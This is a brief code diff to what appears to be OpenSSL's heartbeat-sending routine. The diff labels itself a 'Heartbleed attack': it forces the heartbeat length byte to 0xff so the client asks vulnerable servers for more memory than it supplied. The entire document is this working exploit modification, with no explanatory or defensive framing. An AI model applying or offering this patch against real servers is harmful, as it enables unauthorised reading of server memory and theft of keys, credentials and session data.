@@ -2676,6 +2676,8 @@ tls1_heartbeat(SSL *s)
 	p += 16;
 	/* Random padding */
 	RAND_pseudo_bytes(p, padding);
+	/* Heartbleed attack (always request 255 bytes) */
+	buf[2] = 0xff;
 
 	ret = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buf, 3 + payload + padding);
 	if (ret >= 0)
